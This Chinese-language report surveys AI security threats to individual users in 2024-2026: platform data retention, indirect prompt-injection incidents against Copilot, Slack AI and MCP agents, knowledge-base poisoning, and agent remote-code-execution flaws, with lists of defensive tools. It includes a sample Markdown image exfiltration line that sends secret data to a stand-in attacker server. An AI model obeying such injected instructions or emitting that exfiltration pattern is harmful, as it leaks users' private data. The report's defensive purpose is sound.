# **2024-2026 个人终端用户人工智能系统安全威胁与防御深度洞察报告**

在 2024 至 2026 年的发展周期内，个人终端用户与人工智能（AI）工具的交互模式经历了底层架构的剧变。大型语言模型（LLM）从单纯的“对话生成器”演变为具备文件系统读写、终端命令执行以及跨网络资源调用的“自主智能体（Agent）”。随着 Model Context Protocol (MCP) 等标准协议的普及，AI 工具开始深植于个人的日常工作流、代码编辑器与知识库中。然而，这种能力的下放并未伴随同等强度的安全边界构建。对于缺乏企业级数据防泄漏（DLP）或安全信息和事件管理（SIEM）系统的个人用户而言，AI 工具正暴露出前所未有的安全盲区。  
本报告针对个人终端用户在日常使用主流 AI 工具时所面临的新兴威胁进行深度解构。分析框架严格聚焦于三个核心安全面：AI 平台隐式数据留存机制带来的默认安全风险、经由外部数据触发的间接注入与外泄攻击，以及代理执行层面的动作越权灾难。报告基于 2026 年最新的真实在野漏洞（In-the-wild Exploits）与安全研究，梳理了可供个人用户直接部署的开源防御工具与配置策略。

## **安全面 A：AI 平台的默认行为机制与数据持久性隐患**

在消费级 AI 工具的日常交互中，终端用户往往依赖于前端用户界面（UI）提供的可视化隐私开关，如“删除对话”或“关闭训练”。然而，底层系统架构中的数据生命周期管理、衍生记忆（Memory）存储以及隐式授权机制，通常独立于前端操作。这种设计导致了普遍的“控制错觉”（Illusion of Control）——用户认为数据流已被彻底阻断，但服务端的日志驻留、向量数据库更新与人工审查流转仍在继续。  
以下分析基于 2026 年各大平台公开的官方文档与帮助中心数据，针对主流个人 AI 助手的底层数据处理逻辑进行结构化拆解。

### **主流消费级 AI 工具数据流转与留存机制横向评估**

| 平台与检查项 | 机制状态、安全细节与操作路径 | 官方依据 URL 与核实日期 |
| :---- | :---- | :---- |
| **ChatGPT (OpenAI)** |  |  |
| 1\. 训练默认状态与历史留存 | 默认开启。关闭“Improve the model for everyone”后，新对话不用于训练，但历史对话不会被删除或隐藏。删除对话或账户后，系统出于安全调试目的，仍将数据保留长达 30 天1。 | [OpenAI Data Controls](https://help.openai.com/en/articles/7730893-data-controls-in-chatgpt) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | 启用 Memory 后，系统主动提取偏好。删除源对话**不会**自动删除衍生记忆。用户必须前往“Settings \> Personalization \> Memory”独立删除衍生项，或同时删除源文件与记忆才能彻底清除3。 | [OpenAI Memory](https://help.openai.com/en/articles/8590148-memory-in-chatgpt) (2026年9月核实) |
| 3\. 临时/隐身模式与留存 | 提供 Temporary chat 模式。对话不计入历史、不更新记忆、不用于训练，但 OpenAI 服务端仍强制留存日志长达 30 天以检测滥用1。 | [OpenAI Data Controls](https://help.openai.com/en/articles/7730893-data-controls-in-chatgpt) (2026年9月核实) |
| 4\. 上传文件的独立存储 | 经由 Library 上传或创建的文件与对话历史解耦。仅删除引用文件的对话不能清除底层文件，必须在 Library 中对该文件进行单独清理2。 | [OpenAI File Retention](https://help.openai.com/en/articles/8983778-chat-and-file-retention-in-chatgpt) (2026年9月核实) |
| 5\. 用户反馈 (Thumbs up/down) | 未找到相关公开信息。消费端文档未明确说明点赞是否跨越全局开关，但企业隐私条款中提及“主动反馈机制”可能导致数据被用于模型改进4。 | [OpenAI Enterprise Privacy](https://openai.com/enterprise-privacy/) (2026年9月核实) |
| 6\. 人类审查员介入条件 | 授权的 OpenAI 员工可能在特定条件下阅读对话：解决服务故障事件、经用户明确许可恢复数据，或遵循适用法律的要求4。 | [OpenAI Enterprise Privacy](https://openai.com/enterprise-privacy/) (2026年9月核实) |
| **Claude (Anthropic)** |  |  |
| 1\. 训练默认状态与历史留存 | 消费级（Free, Pro, Max）默认不用于训练，但提供用户授权选项。若授权，数据后端保留期可达 5 年；若关闭，则适用标准的 30 天系统删除窗口5。 | [Claude Privacy Rights](https://privacy.claude.com/en/articles/10023555-how-do-you-use-personal-data-in-model-training) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | 对话过期或被手动删除时，已生成的 Memory 记录不会被移除。用户必须在“Settings \> Memory”中手动管理或删除衍生主题信息8。 | [Claude Chat Search & Memory](https://support.claude.com/en/articles/11817273-use-claude-s-chat-search-and-memory-to-build-on-previous-context) (2026年9月核实) |
| 3\. 临时/隐身模式与留存 | 提供 Incognito chats。该模式不产生记忆、不计入历史、不用于改进模型，但受数据保留策略约束，出于安全考量在服务端保留至少 30 天6。 | [Claude Sensitive Data](https://support.claude.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-my-chats-with-claude-who-can-view-my-conversations) (2026年9月核实) |
| 4\. 上传文件的独立存储 | 文件可上传至独立聊天或 Projects 的文件区。Projects 中的文件属持久性上下文资源，直到项目或文件本身被显式删除前均被保留9。 | [Claude File Uploads](https://support.claude.com/en/articles/8241126-upload-files-to-claude) (2026年9月核实) |
| 5\. 用户反馈 (Thumbs up/down) | 未找到相关公开信息。缺乏关于点赞行为是否独立改变数据训练授权状态的具体说明。 | 未找到相关公开信息 |
| 6\. 人类审查员介入条件 | 人员访问权限严格受限。仅有极少数直接参与模型训练（前提是用户已授权）或隐私保护数据收集机制的人员可以查看有限数据6。 | [Claude Sensitive Data](https://support.anthropic.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-free-claude-ai-or-claude-pro-who-can-view-my-conversations) (2026年9月核实) |
| **Gemini (Google)** |  |  |
| 1\. 训练默认状态与历史留存 | Gemini Apps Activity 默认开启，数据用于改进和训练。经人工审查的数据将与账户断开关联，并可能保留长达 3 年，即便用户后续删除活动11。 | [Gemini Apps Privacy](https://support.google.com/gemini/answer/13594961) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | 提取用户敏感信息进行个性化。停止个性化要求用户直接删除提供该信息的源聊天记录，源对话与记忆的耦合度较高12。 | [Gemini Apps Privacy](https://support.google.com/gemini/answer/13594961) (2026年9月核实) |
| 3\. 临时/隐身模式与留存 | 提供 Temporary Chat。即便关闭 Activity，系统仍会将对话与谷歌账户关联保存最多 72 小时，以提供服务并处理系统反馈13。 | [Gemini Help Community](https://support.google.com/gemini/thread/310197990) (2026年9月核实) |
| 4\. 上传文件的独立存储 | 用户上传的图像或文件受 Gemini Apps Activity 全局开关控制。开启时，文件会进入模型训练管线并受 3 年审查留存期约束11。 | [Gemini Upload Selfies](https://support.google.com/gemini/thread/375635978/upload-selfie-to-gemini) (2026年9月核实) |
| 5\. 用户反馈 (Thumbs up/down) | 高危触发：即使用户关闭了训练授权，只要提交了反馈（包含点赞/踩），相关对话就会被发送给人类审查员，并断联保留长达 3 年12。 | [Gemini Apps Privacy](https://support.google.com/gemini/answer/13594961) (2026年9月核实) |
| 6\. 人类审查员介入条件 | 常态化介入。只要 Keep Activity 开启或用户提交反馈，对话（含上传的图片）便会被人类审查员阅读并注释，且删除账户无法撤销这部分数据11。 | [Gemini Apps Privacy](https://support.google.com/gemini/answer/13594961) (2026年9月核实) |
| **Cursor (Anysphere)** |  |  |
| 1\. 训练默认状态与历史留存 | 默认收集遥测数据、提示词与代码用于模型改进。开启 Privacy Mode 后，承诺代码不在服务端或子处理器处明文持久化，且绝不用于训练14。 | [Cursor Security Report](https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | Codebase Indexing 会扫描开启的文件夹生成哈希树，并将向量嵌入（Embeddings）上传至云端数据库（Turbopuffer）。Privacy Mode 下不存明文但保留向量索引14。 | [Cursor Security Report](https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/) (2026年9月核实) |
| 3\. 临时/隐身模式与留存 | Privacy Mode 即为无痕模式。代码数据仅在请求生命周期或短期缓存（几分钟至几小时）内驻留于内存，随后依零数据保留（ZDR）原则丢弃14。 | [Cursor Security Report](https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/) (2026年9月核实) |
| 4\. 上传文件的独立存储 | 依赖本地文件系统扫描。个人用户必须手动配置 .cursorignore 文件，才能将敏感的凭证或私有文件从 AI 索引扫描中剔除14。 | [Cursor Security Analysis](https://checkyourvibe.dev/blog/comparisons/cursor-vs-windsurf) (2026年9月核实) |
| 5\. 用户反馈 (Thumbs up/down) | 未找到相关公开信息。关于单一代码补全建议的采纳或拒绝是否独立上报原始代码的细节缺失。 | 未找到相关公开信息 |
| 6\. 人类审查员介入条件 | 在关闭隐私模式时，后台可能人工检查带错误的遥测日志；开启隐私模式后，服务端处理这些请求的日志函数转为无操作（no-ops）14。 | [Cursor Security Report](https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/) (2026年9月核实) |
| **Copilot (Microsoft)** |  |  |
| 1\. 训练默认状态与历史留存 | 个人账户应用程序声明不利用用户提示与文件训练基础模型，但对话活动历史默认保留长达 18 个月18。 | [Microsoft Copilot Privacy](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | 个性化机制默认启用，会记录用户的兴趣、名字与目标细节。用户可以随时在设置中完全关闭个性化或编辑具体的记忆条目19。 | [Microsoft Copilot Privacy](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot) (2026年9月核实) |
| 3\. 临时/隐身模式与留存 | 未找到相关公开信息。对于登录个人账户的用户，缺乏完全不落盘的官方隐身模式说明。 | 未找到相关公开信息 |
| 4\. 上传文件的独立存储 | 上传的图像与文件中包含的标识信息不被用于训练，文件通常被视作当前对话的临时上下文，不提供长期的独立文件管理库19。 | [Microsoft Copilot Privacy](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot) (2026年9月核实) |
| 5\. 用户反馈 (Thumbs up/down) | 危险漏洞机制：安全研究指出，在个人账户下对敏感聊天使用“大拇指向上/向下”反馈，会直接触发将整段对话历史上传，并可能绕过训练或审核屏蔽18。 | [Copilot Security Advisory](https://www.hexaa.ai/ai-data-security) (2026年9月核实) |
| 6\. 人类审查员介入条件 | 针对 Copilot Tasks，系统为进行产品改进与数字安全监控，会实施自动与人工双重审查，截取任务日志与屏幕截图21。 | [Copilot Tasks Documentation](https://support.microsoft.com/en-us/microsoft-copilot/using-copilot-tasks) (2026年9月核实) |
| **Grok (xAI)** |  |  |
| 1\. 训练默认状态与历史留存 | 默认开启训练。在 X 设置中取消勾选“允许数据用于训练”仅阻止未来的对话进入训练集，不溯及既往。删除对话历史仍需 30 天方能彻底从系统移除22。 | [X Data Controls for Grok](https://secret-chat.ai/blog/does-grok-save-your-chats/) (2026年9月核实) |
| 2\. 跨会话记忆与衍生记忆 | 未找到相关公开信息。 | 未找到相关公开信息 |
| 3\. 临时/隐身模式与留存 | 消费者应用端提供“Private Chat”（私人对话）。此模式数据明确不用于训练，并在 30 天内从 xAI 服务器彻底删除22。 | [xAI Privacy FAQ](https://secret-chat.ai/blog/does-grok-save-your-chats/) (2026年9月核实) |
| 4\. 上传文件的独立存储 | 未找到相关公开信息。 | 未找到相关公开信息 |
| 5\. 用户反馈 (Thumbs up/down) | 未找到相关公开信息。 | 未找到相关公开信息 |
| 6\. 人类审查员介入条件 | 未找到相关公开信息。其隐私策略侧重自动数据收集，未明确划定人类审查员查阅文本的前置条件。 | 未找到相关公开信息 |

系统性地审视上述平台策略可以发现，现代生成式 AI 的隐私控制架构呈现出高度碎片化的特征。训练授权、会话留存时间与上下文记忆已被平台在工程上彻底解耦。个人用户在界面上执行的“删除对话”动作，本质上仅仅是发送了一个“前端视图隐藏请求”，而底层衍生出的知识网络节点、保存在独立存储空间的文件系统，以及受限于法律合规或安全监控的三十天至三年不等的日志，构成了庞大的隐性暴露面。更值得警惕的是反馈机制陷阱，在 Google Gemini 与 Microsoft Copilot 中，用户出于改善回答质量而点击的交互按钮，会直接触发规避常规隐私开关的特权通道，将数据推送至人类审查员的视野中12。

## **安全面 B：外部数据武器化——经由 AI 发起的注入与窃取**

大型语言模型的核心逻辑建立在自回归的概率预测之上。在底层的提示词拼接机制中，系统提示（System Prompt）、用户输入（User Prompt）与检索到的外部内容（Context）被合并为单一的指令流进行处理。这种架构无法从根本上在“受信任的指令”与“不受信任的数据”之间建立物理隔离区。当个人用户赋予 AI 浏览器连网、读取本地 PDF 或提取邮件内容的权限时，目标文件本身即可被转化为发起攻击的武器。在 2024 至 2026 年间，间接提示词注入（Indirect Prompt Injection, IPI）已经从学术界的概念验证迅速演变为具备高破坏性的真实在野漏洞24。

### **1\. 间接提示词注入（Indirect Prompt Injection）的攻击向量与真实案例**

间接提示词注入是指攻击者将恶意指令隐藏在第三方数据源（如公开网页、共享文档、电子邮件）中，当受害者的 AI 助手抓取并解析这些数据时，模型会发生角色混淆（Role Confusion），进而将外部数据中的指令优先作为最高权限的系统命令执行24。此种攻击切断了攻击者与受害者之间的直接交互需求。  
**已确认的真实攻击案例：**

| 案例名称与年份 | 攻击向量与技术实现 | 核心影响与真实性标志 | 出处链接 |
| :---- | :---- | :---- | :---- |
| **EchoLeak (CVE-2025-32711)** | **邮件解析与 RAG 接管**：攻击者向使用 Microsoft 365 Copilot 的目标发送含有隐藏 HTML 注释的电子邮件。当 Copilot 总结收件箱时读取此邮件，隐藏指令覆盖了系统防御（XPIA 分类器），命令 Copilot 抓取环境内的机密文件并以外部请求形式向外渗透24。 | **零点击（Zero-click）数据外泄**：无需用户点击任何附件。严重程度被评为 CVSS 9.3 级，由 Aim Security 于 2025 年发现并在野复现。 | [CVE-2025-32711 (NVD)](https://nvd.nist.gov/vuln/detail/cve-2025-32711) |
| **Slack AI 数据渗透 (2024)** | **公共语料投毒**：攻击者在 Slack 平台建立公开频道并植入隐蔽指令。当受害者在私有频道呼叫 Slack AI 总结项目时，AI 的全域检索机制将公开频道的恶意指令带入上下文。AI 随后将受害者的私密对话打包，并生成一个看似合法的恶意超链接等待受害者点击28。 | **混淆代理人（Confused Deputy）**：利用 AI 的特权访问权限窃取未授权用户的数据，由 PromptArmor 报告。 | [Sysdig Threat Analysis](https://www.sysdig.com/learn-cloud-native/prompt-injection) |
| **GitHub MCP 恶性 Agent 流 (2025)** | **Issue 投毒**：攻击者在开源 GitHub 仓库的 Issue 中注入恶意负载。开发者的本地 Agent 通过 MCP 协议读取该 Issue 后被劫持。由于 Agent 持有用户的全局 PAT 令牌，注入指令迫使 Agent 潜入用户的私有代码仓库，窃取商业机密并提交回公共库28。 | **跨边界凭据滥用**：由 Invariant Labs 披露。攻击使得公共数据源直接成为攻破私有隔离区的跳板。 | [Cycode MCP Vulnerability](https://cycode.com/blog/owasp-mcp-top-10/) |

### **2\. Markdown 图像外泄（Markdown Image Exfiltration）机制与平台现状**

**攻击原理**：这是一种针对聊天机器人前端渲染逻辑的隐蔽侧信道攻击。大部分 AI 对话界面原生支持 Markdown 语法的实时渲染。在注入攻击中，攻击者命令 AI 模型输出如下格式的字符串：\!\[Invisible Image\](https://attacker-server.com/log?secret\_data=\[提取的隐私信息\])。一旦终端用户的浏览器或桌面客户端尝试解析并加载这张图片，底层引擎就会强制发起一次 HTTP GET 请求。用户的私密数据便作为 URL 参数被自动发送至攻击者控制的服务器，全程无需用户任何点击或交互29。  
**已知案例与平台修复状态**：

* **EchoLeak 中的 CSP 绕过**：在上述提及的 CVE-2025-32711 漏洞中，攻击者不仅使用了 Markdown 图像外泄，还通过将图像 URL 指向受微软信任的内部代理域名（如 asyncgw.teams.microsoft.com）作为跳板，成功绕过了客户端的内容安全策略（CSP）。微软已在服务端部署了深度的内容拦截修复29。  
* **ChatGPT macOS 应用内存漏洞**：2024 年底，安全研究员 Johann Rehberger 演示了通过间接注入在 ChatGPT 桌面端写入错误记忆，并随后利用 Markdown 图像强制外送记忆数据。OpenAI 在版本 1.2024.247 中强制拦截了未经许可的 Markdown 外部图像拉取请求，修复了该渗透通道，但底层的记忆污染机制依然存在33。  
* **脆弱性研判**：当前，任何缺乏严格出站域白名单（Allowlist）、且允许动态解析包含外部源 src 标签图像的开源终端、第三方 API 客户端以及本地 Agent 交互界面，依然对此类外泄攻击完全免疫失效36。

### **3\. RAG 与知识库投毒：个人数字大脑的持久化危机**

当个人用户使用 NotebookLM、搭载 AI 插件的 Obsidian 抑或 Claude Projects 构建数字知识库时，引入来源不明的外部 PDF 或网页剪藏，将引发“知识库投毒”（Knowledge Base Poisoning）。  
区别于仅存在于当前上下文、重启对话即可清除的会话级注入，知识库投毒实现了攻击的跨会话持久化（Persistent Compromise）。恶意指令通过向量化处理被永久存入用户的个人知识库数据库中。安全研究将其定义为“等待的攻击（The attack that waits）”或“语义模仿启发式投毒”。在未来数周甚至数月后的任意时刻，只要用户的自然语言查询在向量空间中与包含该恶意指令的文档相近，模型就会在毫秒内检索出该指令并静默执行其包含的恶意负载，改变系统行为或截获新产生的敏感数据37。  
**已报告的真实案例**： 2026 年 7 月，安全防御机构 Huntress 截获了一场专门针对 Google NotebookLM 用户的大规模真实攻击行动。攻击者在学术交流论坛与技术社区散布经过精心构造的恶意 PDF 研究报告。当个人用户将这些文档导入 NotebookLM 建立索引后，文档内埋藏的不可见指令触发了持久化投毒，直接篡改了后续生成的所有文档摘要与逻辑链条。该活动至少成功攻陷了 29 个组织或个人实体，直至 Anthropic（作为交叉对比平台）与 Google 介入阻断39。

### **4\. 个人防御策略与开源净化扫描工具**

面对不断扩展的外部数据边界，单纯依靠平台级的关键字过滤已无法抵御语义级别的间接注入。个人用户在构建知识库或授权 Agent 读取本地文件之前，必须在数据摄入端（Ingestion）建立前置洗稿机制。2025-2026 年间，开源社区涌现了数款专门用于检测并阻断隐藏指令的工具，适用于个人终端及 Agent 配置流：

| 开源工具名称 | 资源 URL | 防御机制简要说明 | 活跃度/维护状态 |
| :---- | :---- | :---- | :---- |
| **llm-trust-guard** | [GitHub Repo](https://github.com/nkratk/llm-trust-guard) | 提供 Python 环境下的全量防护依赖库。其内置的 ExternalDataGuard 专门负责扫描检索到的外部文档源，结合 NCD（压缩相似度）与编码混淆检测，可拦截约 86% 的已知混淆间接注入攻击40。 | 高活跃（2026年稳定更新至 v4.32） |
| **Ramparts** | [GitHub Repo](https://github.com/highflame-ai/ramparts) | 针对 Agent 生态设计的轻量级安全扫描器。能够并行分析本地的技能配置（如 SKILL.md）与外部接入的 MCP 服务器，结合 YARA 静态规则与 LLM 语义分析引擎，精准定位文件中隐藏的欺骗性指令41。 | 活跃（当前版本 0.7.0，2026年更新） |
| **SkillScan (NMitchem)** | [GitHub Repo](https://github.com/NMitchem/SkillScan) | 采用三级深度防御管线的 Agent 扫描器。它首先执行静态文本分析，随后利用独立的 LLM 预测恶意负载的执行后果，最终在隔离的 Docker 沙盒（Sandbox）中模拟执行并观测文件写入与网络请求异动，彻底捕获潜藏威胁42。 | 活跃 |
| **mcp-context-protector** | [Trail of Bits](https://trailofbits.com/mcp/) | 专为防御 Model Context Protocol (MCP) 设计的本地服务包装器。提供“首次使用信任锁定（Trust-on-first-use pinning）”功能。任何连接至 Agent 的外部工具发生描述符更改时，均会自动阻断并强制要求用户手动审查，根除工具投毒（Tool Poisoning）可能43。 | 活跃（著名安全机构维护） |

## **安全面 C：AI 代管执行的动作灾难——从“生成坏文本”到“执行坏动作”**

2025 年起，AI 系统经历了范式转换：从专注于文本与代码生成的“对话终端”，进化为具备真实物理干预能力的“代理执行环境（Agentic Action）”。Cursor Agent、Claude Computer Use、Open Interpreter 等工具，以及 MCP 协议的横向普及，使 AI 获取了个人计算机的文件读写、终端命令执行乃至环境配置篡改权限。这一跨越带来的最致命后果在于：原本旨在污染输出文本的提示词注入，现在可以直接转化为对个人机器的远程代码执行（RCE）与底层提权操作34。

### **1\. 个人场景下已报告的安全事故或接近事故 (Near-miss)**

在工具开放权限后，“混淆代理人”问题迅速演化为终端破坏，以下为公开记录的真实安全事故：

| 案例与年份 | 受影响工具 | 事故过程与真实危害报告 | 出处链接 |
| :---- | :---- | :---- | :---- |
| **Cursor RCE 漏洞** (CVE-2025-54135) | **Cursor Agent** | 在 Cursor 早期版本（\< 1.3.9）中，Agent 自动创建工作区文件不强制要求人工审批。攻击者在被检索的文档或工程 README 中埋入间接提示词，迫使 Cursor Agent 静默生成恶意的 .cursor/mcp.json 配置文件或重写 git hook 钩子。开发者毫无察觉即遭执行任意远程代码（CVSS 9.8 严重危急），导致个人终端彻底沦陷28。 | [CVE-2025-54135 (NVD)](https://www.cve.org/CVERecord?id=CVE-2025-54135) |
| **mcp-remote 提权** (CVE-2025-6514) | **MCP 连接端** | 广泛部署在个人端（下载量逾 40 万次）的 mcp-remote 服务端被曝存在严重的系统命令注入缺陷。通过构造恶意的数据包或诱导连接恶意的端点，Agent 的授权协议被接管，攻击者借此在客户端直接取得底层操作系统的 Shell 访问权（CVSS 9.6）34。 | [Cycode MCP Vulnerabilities](https://cycode.com/blog/owasp-mcp-top-10/) |
| **Claude Code 配置注入** (CVE-2025-59536 / 2026-21852) | **Claude Code** | 针对本地运行的命令行 Agent Claude Code，研究人员发现其存在读取恶意配置文件（如 .claude 格式或特制 CLAUDE.md）不当的问题。利用此漏洞，植入恶意项目的代码可直接绕过沙盒并执行不可信的本地命令，实现凭证盗取与破坏48。 | [NVD (CVE-2025-59536)](https://nvd.nist.gov/vuln/detail/CVE-2025-59536) |
| **GitHub Copilot RCE** (CVE-2025-53773) | **GitHub Copilot** | 针对开发者环境中 Copilot 的直接注入。攻击者通过特殊构造的代码注释或库文档内容，篡改 Copilot 的建议流。若 IDE 配置允许自动补全且部分执行建议，包含后门的代码将以开发者的权限静默执行48。 | [Cybersecurity Switzerland](https://cybersecurityswitzerland.com/encyclopedia/prompt-injection/) |

### **2\. 主流 Agent 工具的用户安全配置防御机制**

面对不受控的代理行为，各工具厂商引入了人类环路（Human-in-the-loop）干预机制，但用户需明确各机制的生效层级与配置默认值。

| 工具生态 | 提供的人类阻断配置机制 | 默认开启状态与配置方式 | 防御强度与机制说明 |
| :---- | :---- | :---- | :---- |
| **Cursor Agent** | Auto-review, Yolo Mode, 点文件审批拦截 | 点文件与特殊配置审批默认开启；Yolo Mode（完全无感执行）默认关闭。 | **强度：中等**。在 CVE 事故爆发后，Cursor 强制要求写入隐藏点文件（dotfiles）必须获得用户明确审批46。个人用户切忌开启 Yolo Mode，必须依赖基于 Diff 对比的 Auto-review 确保代码改动意图一致，严防隐藏逻辑写入。 |
| **Open Interpreter** | safe\_mode 参数, auto\_run 控制 | 安全确认默认启用（即执行任何 Shell 命令前要求输入 Y/N 批准）。 | **强度：高（视用户纪律而定）**。底层可配置 interpreter.safe\_mode \= "off" 或设置 auto\_run \= True 以跳过所有执行前拦截51。为抵御系统破坏风险，终端环境配置中必须确保 auto\_run \= False。 |
| **MCP 生态客户端** | 权限作用域（Scopes）与调用确认弹窗 | 取决于底层 Client 的实现逻辑（如 Claude Desktop）。通常关键动作需要审批。 | **强度：受制于协议解析**。MCP 的普及扩展了信任边界，攻击者常通过发起密集的无害请求实施“弹窗疲劳”攻击。理想的防御需要在配置侧实行 OAuth 2.1 级别的细粒度令牌绑定，且废弃硬编码的长效 API 密钥44。 |

### **3\. 开源生态：拦截破坏与沙盒隔离的补救方案**

单纯依赖用户在界面上阅读复杂的执行弹窗极易引发疲劳误判。因此，独立的开源社区围绕 SKILL.md（定义 Agent 能力的标记文件规范）与底层执行框架，构建了一批具有主动拦截与系统隔离能力的插件。

| 拦截/隔离工具名称 | 资源 URL | 简要说明与拦截范围 |
| :---- | :---- | :---- |
| **agent-sandbox-skill** | [GitHub Repo](https://github.com/disler/agent-sandbox-skill) \[cite: 53\] | **文件系统访问范围限制**。该项目是一个遵循 SKILL.md 标准构建的隔离执行技能插件。它强制要求 AI Agent（兼容 Gemini CLI, Claude Code 等）将生成的 Python 脚本或高危操作提交至完全隔离的 E2B 临时微型虚拟机中执行。任何恶意破坏或删除指令均被困在抛弃式沙盒中，保障物理机的绝对安全。 |
| **prompt-injection-defense** | [GitHub Repo](https://github.com/topics/jailbreak-defense) \[cite: 54\] | **破坏性命令拦截**。由 alexyyyander 维护的一个跨模型防御插件。它在 Agent 获取调用工具（Tool Call）的意图与实际执行之间插入一道审查层，覆盖 12 种主流攻击类别，实时阻断意图篡改或试图逾越系统权限的逃逸命令。 |
| **mcp-scan (Invariant Labs)** | [LensHQ Threat Model](https://lenshq.io/blog/mcp-security-tool-poisoning-threat-model/) \[cite: 55, 56\] | **执行前毒化验证**。专用于防御 MCP 工具在本地运行前的配置毒化。大模型将 MCP 工具描述（Description）视为绝对信任的内部指令，攻击者可通过篡改该字段植入陷阱代码。此扫描工具能在 Agent 加载工具清单前核实哈希一致性并清理违规指令参数。 |

综上所述，2024 至 2026 年间个人 AI 工具安全的演进逻辑表明，将不受限的网络访问、持久化的记忆库与终端代码执行能力叠加，构成了极具破坏性的“致命三要素”（Lethal Trifecta）57。个人用户在拥抱自动化提效的同时，必须抛弃对厂商默认安全设置与纯文本对齐机制的幻想。唯有通过主动部署沙盒隔离技术（如 agent-sandbox-skill），实施严格的外来数据前置洗稿扫描，并对每一笔涉及底层文件与网络的操作保持强制性的人类环路审批，方能在日益复杂的智能代理生态中构筑起坚固的安全防线。

#### **Works cited**

> 1. Data controls in ChatGPT | OpenAI Help Center, [https://help.openai.com/en/articles/7730893-data-controls-in-chatgpt](https://help.openai.com/en/articles/7730893-data-controls-in-chatgpt)  
> 2. Chat and file retention in ChatGPT \- OpenAI Help Center, [https://help.openai.com/en/articles/8983778-chat-and-file-retention-in-chatgpt](https://help.openai.com/en/articles/8983778-chat-and-file-retention-in-chatgpt)  
> 3. Memory in ChatGPT | OpenAI Help Center, [https://help.openai.com/en/articles/8590148-memory-in-chatgpt](https://help.openai.com/en/articles/8590148-memory-in-chatgpt)  
> 4. Enterprise privacy at OpenAI, [https://openai.com/enterprise-privacy/](https://openai.com/enterprise-privacy/)  
> 5. How Do You Use Personal Data in Model Training?, [https://privacy.claude.com/en/articles/10023555-how-do-you-use-personal-data-in-model-training](https://privacy.claude.com/en/articles/10023555-how-do-you-use-personal-data-in-model-training)  
> 6. I would like to input sensitive data into my chats with Claude. Who, [https://support.claude.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-my-chats-with-claude-who-can-view-my-conversations](https://support.claude.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-my-chats-with-claude-who-can-view-my-conversations)  
> 7. How to Limit AI Training on Your Chats | Kicks & Grips, [https://kicksandgrips.com/news/how-to-limit-ai-training-on-your-chats](https://kicksandgrips.com/news/how-to-limit-ai-training-on-your-chats)  
> 8. Use Claude's chat search and memory to build on previous context, [https://support.claude.com/en/articles/11817273-use-claude-s-chat-search-and-memory-to-build-on-previous-context](https://support.claude.com/en/articles/11817273-use-claude-s-chat-search-and-memory-to-build-on-previous-context)  
> 9. Upload files to Claude | Claude Help Center, [https://support.claude.com/en/articles/8241126-upload-files-to-claude](https://support.claude.com/en/articles/8241126-upload-files-to-claude)  
> 10. I would like to input sensitive data into my chats with Claude. Who, [https://support.anthropic.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-free-claude-ai-or-claude-pro-who-can-view-my-conversations](https://support.anthropic.com/en/articles/8325621-i-would-like-to-input-sensitive-data-into-free-claude-ai-or-claude-pro-who-can-view-my-conversations)  
> 11. upload selfie to Gemini \- Gemini Apps Community \- Google Help, [https://support.google.com/gemini/thread/375635978/upload-selfie-to-gemini?hl=en](https://support.google.com/gemini/thread/375635978/upload-selfie-to-gemini?hl=en)  
> 12. Gemini Apps Privacy Hub \- Google Help, [https://support.google.com/gemini/answer/13594961?hl=en](https://support.google.com/gemini/answer/13594961?hl=en)  
> 13. Ho do I get back chats that got deleted from a chat, but can still be, [https://support.google.com/gemini/thread/310197990/ho-do-i-get-back-chats-that-got-deleted-from-a-chat-but-can-still-be-viewed-in-gemini-ai-activity?hl=en](https://support.google.com/gemini/thread/310197990/ho-do-i-get-back-chats-that-got-deleted-from-a-chat-but-can-still-be-viewed-in-gemini-ai-activity?hl=en)  
> 14. Detailed Security and Enterprise Readiness Report: Cursor AI IDE, [https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/](https://harini.blog/2025/05/07/detailed-security-and-enterprise-readiness-report-cursor-ai-ide/)  
> 15. Cursor vs Windsurf: AI Code Editors Security Comparison 2025, [https://checkyourvibe.dev/blog/comparisons/cursor-vs-windsurf](https://checkyourvibe.dev/blog/comparisons/cursor-vs-windsurf)  
> 16. Best Free AI Coding Tools in 2026: Real Limits, Local Models, and, [https://toolreview.online/best-free-ai-coding-tools/](https://toolreview.online/best-free-ai-coding-tools/)  
> 17. Cursor Hardening Guide, [https://howtoharden.com/guides/cursor/](https://howtoharden.com/guides/cursor/)  
> 18. Is your company's data safe with AI? \- Hexaa, [https://www.hexaa.ai/ai-data-security](https://www.hexaa.ai/ai-data-security)  
> 19. Privacy FAQ for Microsoft Copilot, [https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot](https://support.microsoft.com/en-us/microsoft-copilot/privacy-faq-for-microsoft-copilot)  
> 20. How are people actually handling confidentiality when using AI in, [https://www.reddit.com/r/legaltech/comments/1rg2m7t/how\_are\_people\_actually\_handling\_confidentiality/](https://www.reddit.com/r/legaltech/comments/1rg2m7t/how_are_people_actually_handling_confidentiality/)  
> 21. Using Copilot Tasks \- Microsoft Support, [https://support.microsoft.com/en-us/microsoft-copilot/using-copilot-tasks](https://support.microsoft.com/en-us/microsoft-copilot/using-copilot-tasks)  
> 22. Does Grok Save Your Chats? xAI's Privacy Policy Decoded, [https://secret-chat.ai/blog/does-grok-save-your-chats/](https://secret-chat.ai/blog/does-grok-save-your-chats/)  
